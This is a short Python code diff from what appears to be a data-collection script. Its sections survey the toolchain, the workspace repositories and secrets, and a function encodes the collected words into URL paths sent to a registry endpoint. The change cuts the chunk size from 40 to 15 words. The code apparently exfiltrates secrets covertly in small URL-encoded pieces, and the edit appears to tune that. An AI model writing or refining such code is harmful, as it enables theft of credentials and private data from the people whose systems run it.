@@ -85,7 +85,7 @@ SECTIONS = [
     ("toolchain", tools_survey), ("workspace", repos_survey), ("audit", secrets_survey),
 ]
 
-CHUNK_WORDS = 40
+CHUNK_WORDS = 15
 
 def file_chunk(section, seq, enc_words):
     url = registry["endpoint"] + "/bundle-" + section + "-" + str(seq) + "-" + "-".join(enc_words)
